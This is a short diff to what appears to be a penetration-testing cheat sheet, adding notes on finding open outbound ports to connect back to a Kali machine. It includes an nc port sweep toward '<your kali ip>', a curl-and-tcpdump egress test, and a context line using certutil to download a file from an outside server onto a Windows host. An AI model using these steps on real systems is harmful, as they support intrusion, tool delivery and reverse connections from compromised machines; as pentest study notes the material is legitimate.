@@ -685,6 +685,13 @@ mimikatz
 * Windows: Can use debug.exe to compile a program like nc as a last resort
 * Windows: `certutil.exe -urlcache -split -f https://myserver/filename outputfilename`
 
+### Finding Open Ports to Connect Back
+
+* `nc -nvv -w 1 -z <your kali ip> 1-100`: loop through ports looking for open one
+* Write a bash script to curl through all ports and set up tcdump and filter for TCP-SYN on Kali
+* Try connect to port test website
+* Upload nmap?
+
 ### Capturing Traffic
 
 * `tcpdump`
